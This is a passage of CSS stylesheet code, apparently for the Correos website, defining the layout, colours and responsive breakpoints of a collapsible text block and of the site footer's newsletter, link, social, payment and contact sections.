				[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
					max-height: 432px
				}
			}

			@media (min-width: 1024px) {
				[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .content-body.sc-correos-ui-plain-text {
					max-height: 432px
				}
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text {
				overflow: hidden;
				position: relative
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
				content: "";
				position: absolute;
				width: 100%;
				height: 80px;
				background: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(var(--_ui-plaintext-color-bg)));
				background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, var(--_ui-plaintext-color-bg) 100%);
				bottom: 0
			}

			@media (min-width: 640px) {
				[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
					height: 104px
				}
			}

			@media (min-width: 1024px) {
				[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.sc-correos-ui-plain-text:before {
					height: 104px
				}
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text {
				max-height: 100%;
				overflow: auto
			}

			[variant=text-collapse-desktop].sc-correos-ui-plain-text-h .overflow-gradient.open.sc-correos-ui-plain-text:before {
				display: none
			}
		</style>
		<style>
			.sc-correos-cdk-core-footer-h {
				--_cdk-core-footer-background-color-rrss: var(--cdk-core-footer-background-color-rrss, #FFCD00);
				--_cdk-core-footer-background-color-lite: var(--cdk-core-footer-background-color-lite, #333333);
				--_cdk-core-footer-background-color: var(--cdk-core-footer-background-color, #333333);
				--_cdk-core-footer-color-font: var(--cdk-core-footer-color-font, #ffffff);
				--_cdk-core-footer-border-color: var(--cdk-core-footer-border-color, #cbcbcb);
				--_cdk-core-footer-icon-color: var(--cdk-core-footer-icon-color, #002e6d);
				--_cdk-core-footer-color-font-dark: var(--cdk-core-footer-color-font-dark, #002e6d);
				--_cdk-core-footer-newsletter-bg: var(--cdk-core-footer-color-bg-newsletter, #f8f8f8);
				--_cdk-core-footer-newsletter-title: var(--cdk-core-footer-color-title-newsletter, #333333);
				--_cdk-core-footer-color-rectangle: var(--cdk-core-footer-color-color-rectangle, #ffcd00);
				--_cdk-core-footer-color-left-links: var(--cdk-core-footer-color-color-left-links, #002e6d)
			}

			.sc-correos-cdk-core-footer-h {
				display: block;
				width: 100%;
				height: 100%;
				font-size: 0;
				z-index: 13
			}

			.sc-correos-cdk-core-footer-h .cdk-section-dark.sc-correos-cdk-core-footer {
				-webkit-box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
				box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
				background-color: var(--_cdk-core-footer-background-color)
			}

			.sc-correos-cdk-core-footer-h .cdk-section-lite.sc-correos-cdk-core-footer {
				background-color: var(--_cdk-core-footer-background-color-lite)
			}

			.sc-correos-cdk-core-footer-h .cdk-section-lite-rrss.sc-correos-cdk-core-footer {
				background-color: var(--_cdk-core-footer-background-color-lite);
				overflow: hidden
			}

			.sc-correos-cdk-core-footer-h .cdk-section-sticky.sc-correos-cdk-core-footer {
				overflow: hidden;
				background-color: var(--_cdk-core-footer-background-color-lite)
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
				background-color: var(--_cdk-core-footer-newsletter-bg);
				padding: 40px 0;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				-webkit-box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
				box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1)
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-img.sc-correos-cdk-core-footer {
				display: none
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-fieldset.sc-correos-cdk-core-footer {
				border: 0;
				padding: 0;
				margin: 0;
				min-width: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: var(--_cdk-core-footer-newsletter-title);
				font-size: 1.5rem;
				line-height: 2.25rem;
				margin-bottom: 8px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-title.sc-correos-cdk-core-footer {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 1rem;
				line-height: 1.5rem;
				font-weight: 300;
				margin-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-description.sc-correos-cdk-core-footer {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-input.sc-correos-cdk-core-footer {
				margin-bottom: 16px
			}

			.sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-checkbox.sc-correos-cdk-core-footer {
				margin-bottom: 16px
			}

			.sc-correos-cdk-core-footer-h .cdk-contact-section.sc-correos-cdk-core-footer {
				background-color: #f8f8f8;
				-webkit-box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
				box-shadow: 0 -5px 20px 0 rgba(0, 0, 0, 0.1);
				padding: 40px 0
			}

			.sc-correos-cdk-core-footer-h .sticky-pos.sc-correos-cdk-core-footer {
				width: 100%;
				position: fixed;
				bottom: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer {
				display: block;
				width: 100%;
				padding: 0 24px;
				padding-top: 40px
			}

			.sc-correos-cdk-core-footer-h .cdk-footer-container__isNewsletter.sc-correos-cdk-core-footer {
				padding: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
				padding-top: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-container-links.sc-correos-cdk-core-footer {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				display: -ms-flexbox;
				display: flex;
				width: 100%;
				-ms-flex-align: start;
				align-items: flex-start;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-footer-h .cdk-footer-rrss.sc-correos-cdk-core-footer {
				z-index: 13
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				width: 100%;
				padding: 15px 0;
				border-bottom: 1px solid var(--_cdk-core-footer-border-color)
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:first-child {
				padding-top: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:last-child {
				border-bottom: 0;
				padding: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				font-size: 1.125rem;
				line-height: 1.625rem;
				display: -ms-flexbox;
				display: flex;
				width: 100%;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__btn.sc-correos-cdk-core-footer:focus {
				outline: none
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer {
				position: relative;
				height: 8px;
				width: 8px
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::before,
			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::after {
				content: "";
				position: absolute;
				bottom: 0px;
				width: 0.1rem;
				height: 100%;
				border-radius: 8px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::before {
				left: -2px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg);
				background-color: var(--_cdk-core-footer-icon-color)
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.sc-correos-cdk-core-footer::after {
				left: 2.5px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg);
				background-color: var(--_cdk-core-footer-icon-color)
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.active.sc-correos-cdk-core-footer::before {
				left: -2px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg)
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon.active.sc-correos-cdk-core-footer::after {
				left: 2.5px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg)
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__container.sc-correos-cdk-core-footer {
				padding: 15px 0;
				border-bottom: 1px solid var(--_cdk-core-footer-border-color);
				margin-bottom: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__list.sc-correos-cdk-core-footer {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				opacity: 0;
				height: 0;
				pointer-events: none
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__list.active.sc-correos-cdk-core-footer {
				padding-top: 20px;
				pointer-events: all;
				height: auto;
				opacity: 1;
				-webkit-transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				-webkit-transition-property: opacity, -webkit-transform;
				transition-property: opacity, -webkit-transform;
				transition-property: opacity, transform;
				transition-property: opacity, transform, -webkit-transform
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__item.sc-correos-cdk-core-footer {
				padding-bottom: 20px
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__item.sc-correos-cdk-core-footer:last-child {
				padding-bottom: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__item--padding-bottom.sc-correos-cdk-core-footer {
				padding-bottom: 20px
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__item--padding-bottom.sc-correos-cdk-core-footer:last-child {
				padding-bottom: 20px
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__title.sc-correos-cdk-core-footer {
				font-size: 1.125rem;
				line-height: 1.625rem;
				color: var(--_cdk-core-footer-color-font-dark);
				font-weight: 300;
				display: block;
				width: 100%;
				padding-bottom: 26px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__title.sc-correos-cdk-core-footer {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__icon-title.sc-correos-cdk-core-footer {
				color: var(--_cdk-core-footer-color-font-dark);
				display: inline-block;
				font-size: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__lnk.sc-correos-cdk-core-footer {
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--_cdk-core-footer-icon-color);
				text-decoration: none
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__lnk.sc-correos-cdk-core-footer {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__lnk.sc-correos-cdk-core-footer:hover {
				text-decoration: underline
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
				display: grid;
				-ms-flex-pack: center;
				justify-content: center;
				-ms-flex-align: center;
				align-items: center
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
					grid-template-columns: auto auto
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
					grid-template-columns: 1fr 1fr
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__block-link.sc-correos-cdk-core-footer {
					grid-template-columns: 1fr 1fr
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__rectangle.sc-correos-cdk-core-footer {
				height: 56px;
				width: 100%;
				background-color: var(--_cdk-core-footer-color-rectangle);
				-webkit-box-shadow: 0 -2px 6px 0 rgba(0, 0, 0, 0.05);
				box-shadow: 0 -2px 6px 0 rgba(0, 0, 0, 0.05)
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rectangle.sc-correos-cdk-core-footer {
					padding-left: 24px;
					padding-right: 24px
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rectangle.sc-correos-cdk-core-footer {
					padding-left: 64px;
					padding-right: 64px
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
				height: 32px;
				color: var(--_cdk-core-footer-color-left-links);
				font-weight: bold;
				letter-spacing: 0;
				text-decoration: none;
				min-width: 140px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: center;
				justify-content: center
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
					font-size: 14px;
					border-right: 1px solid #002e6d
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
					font-size: 16px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__left-links.sc-correos-cdk-core-footer {
					font-size: 16px
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				height: 32px;
				width: 1px
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
					margin-left: 10px;
					border: 1px solid #002e6d
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
					margin-left: 16px;
					border: 1px solid transparent
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__vline.sc-correos-cdk-core-footer {
					margin-left: 16px;
					border: 1px solid transparent
				}
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-left.sc-correos-cdk-core-footer {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: end;
					justify-content: flex-end
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-left.sc-correos-cdk-core-footer {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: start;
					justify-content: flex-start
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-left.sc-correos-cdk-core-footer {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: start;
					justify-content: flex-start
				}
			}

			@media (max-width: 639px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-right.sc-correos-cdk-core-footer {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: start;
					justify-content: flex-start
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-right.sc-correos-cdk-core-footer {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: end;
					justify-content: flex-end
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-white-list__rrss-align-items-right.sc-correos-cdk-core-footer {
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: end;
					justify-content: flex-end
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-social.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				width: 100%;
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none
			}

			.sc-correos-cdk-core-footer-h .cdk-social__item.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 auto;
				flex: 0 1 auto;
				margin-right: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-social__item.sc-correos-cdk-core-footer:last-child {
				margin-right: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-social__lnk.sc-correos-cdk-core-footer {
				color: var(--_cdk-core-footer-icon-color);
				text-decoration: none;
				font-size: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-container-white-img.sc-correos-cdk-core-footer {
				padding: 40px 0;
				padding-bottom: 32px;
				display: -ms-flexbox;
				display: flex;
				width: 100%;
				-ms-flex-align: start;
				align-items: flex-start;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-footer-h .cdk-container-white-img__isNewsletter.sc-correos-cdk-core-footer {
				padding: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-title.sc-correos-cdk-core-footer {
				font-size: 0.875rem;
				line-height: 1.375rem;
				color: var(--_cdk-core-footer-color-font-dark);
				font-weight: 300;
				display: block;
				width: 100%;
				padding-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-title.sc-correos-cdk-core-footer {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-cdk-core-footer-h .cdk-app-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				margin-bottom: 8px
			}

			.sc-correos-cdk-core-footer-h .cdk-app-list__list.sc-correos-cdk-core-footer {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-footer-h .cdk-app-list__item.sc-correos-cdk-core-footer {
				margin-right: 16px;
				margin-bottom: 16px
			}

			.sc-correos-cdk-core-footer-h .cdk-pay-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				margin-bottom: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-pay-list__list.sc-correos-cdk-core-footer {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-footer-h .cdk-pay-list__container-img.sc-correos-cdk-core-footer {
				width: 56px;
				height: 32px;
				border: 0.25px solid var(--_cdk-core-footer-border-color);
				background: var(--_cdk-core-footer-color-font);
				border-radius: 4px;
				margin-right: 16px;
				-webkit-box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
				box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1)
			}

			.sc-correos-cdk-core-footer-h .cdk-pay-list__container-img.sc-correos-cdk-core-footer:last-child {
				margin-right: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-certificate-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%
			}

			.sc-correos-cdk-core-footer-h .cdk-certificate-list__list.sc-correos-cdk-core-footer {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-footer-h .cdk-certificate-list__container-img.sc-correos-cdk-core-footer {
				width: 43px;
				height: 20px;
				margin-right: 15px
			}

			.sc-correos-cdk-core-footer-h .cdk-certificate-list__container-img.sc-correos-cdk-core-footer:last-child {
				margin-right: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-lite-footer.sc-correos-cdk-core-footer {
				background-color: var(--_cdk-core-footer-background-color-lite);
				padding: 24px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: start;
				align-items: flex-start;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-cdk-core-footer-h .cdk-image.sc-correos-cdk-core-footer {
				width: 40px;
				height: 40px
			}

			.sc-correos-cdk-core-footer-h .cdk-container-lite-footer.sc-correos-cdk-core-footer {
				width: 100%
			}

			.sc-correos-cdk-core-footer-h .cdk-contact.sc-correos-cdk-core-footer {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				display: -ms-flexbox;
				display: flex;
				width: 100%;
				-ms-flex-direction: column;
				flex-direction: column;
				padding-top: 24px
			}

			.sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer {
				padding-bottom: 16px
			}

			.sc-correos-cdk-core-footer-h .cdk-contact__item.sc-correos-cdk-core-footer:last-child {
				padding-bottom: 0
			}

			.sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer {
				font-size: 12px;
				line-height: 18px;
				color: var(--_cdk-core-footer-color-font);
				font-weight: 300;
				text-decoration: none
			}

			.sc-correos-cdk-core-footer-h .cdk-contact__lnk.sc-correos-cdk-core-footer:hover {
				text-decoration: underline
			}

			.sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				color: var(--_cdk-core-footer-border-color);
				display: block;
				width: 100%;
				margin-top: 24px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-core-footer-h .cdk-text-footer.sc-correos-cdk-core-footer {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-cdk-core-footer-h .--padding.sc-correos-cdk-core-footer {
				padding: 0 8px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer {
				padding: 48px 0 40px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-content.sc-correos-cdk-core-footer {
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex: 0 1 70%;
				flex: 0 1 70%
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: row;
				flex-direction: row
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-form.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 70%;
				flex: 0 1 70%
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-newsletter-section.sc-correos-cdk-core-footer .cdk-newsletter-wrapper.sc-correos-cdk-core-footer .cdk-newsletter-info.sc-correos-cdk-core-footer .cdk-newsletter-btn.sc-correos-cdk-core-footer {
				margin-left: 24px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-footer-container.sc-correos-cdk-core-footer {
				display: block;
				width: 100%;
				padding-top: 85px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-footer-container--no-links.sc-correos-cdk-core-footer {
				padding-top: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-container-links.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-container-links.sc-correos-cdk-core-footer {
				-ms-flex-wrap: nowrap;
				flex-wrap: nowrap;
				border-bottom: 1px solid var(--_cdk-core-footer-border-color);
				padding-bottom: 48px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer {
				-ms-flex: 0 1 calc(100% / 4 - 10px);
				flex: 0 1 calc(100% / 4 - 10px);
				margin-right: 10px;
				border-bottom: 0;
				padding: 0 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:last-child,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list.sc-correos-cdk-core-footer:last-child {
				margin-right: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-white-list__container.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list__container.sc-correos-cdk-core-footer {
				padding: 0;
				border-bottom: 0;
				margin-bottom: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-white-list__list.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list__list.sc-correos-cdk-core-footer {
				padding-top: 0
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-white-list__icon-title.sc-correos-cdk-core-footer,
			[size=lg].sc-correos-cdk-core-footer-h .cdk-white-list__icon-title.sc-correos-cdk-core-footer {
				display: block;
				width: 100%;
				margin-bottom: 26px;
				font-size: 34px;
				height: 36px
			}

			[size=md].sc-correos-cdk-core-footer-h .cdk-container-white-img.sc-correos-cdk-core-footer,
